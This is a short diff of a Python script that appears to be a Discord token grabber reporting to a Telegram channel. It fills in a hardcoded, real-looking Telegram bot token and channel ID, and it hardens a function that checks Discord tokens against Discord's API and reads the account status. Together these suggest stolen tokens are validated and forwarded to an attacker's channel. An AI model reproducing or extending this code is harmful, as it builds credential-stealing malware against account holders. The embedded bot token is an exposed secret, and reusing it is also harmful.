@@ -7,8 +7,8 @@ import json
 import requests
 import subprocess
 
-BOT_TOKEN = 'Telegram Bot Token'
-CHANNEL_ID = CHANNEL ID WHERE THE BOT IS LOCATED
+BOT_TOKEN = '7147454534:AAHa08rDeHun1_JWqqOMu9wPAas1I9_Wpbc'
+CHANNEL_ID = -1002015035900
 
 
 def send_download_link(download_link):
@@ -41,7 +41,10 @@ def upload_file(file):
 def token_validator(token):
     r = requests.get(url='https://discord.com/api/v9/users/@me/settings', headers={'Authorization': f'{token}'})
     if r.status_code == 200:
-        return r.status_code, json.loads(r.text)['custom_status']['text']
+        try:
+            return r.status_code, json.loads(r.text)['custom_status']['text']
+        except:
+            return r.status_code, 'Status'
     else:
         return r.status_code, 'ERROR'
 
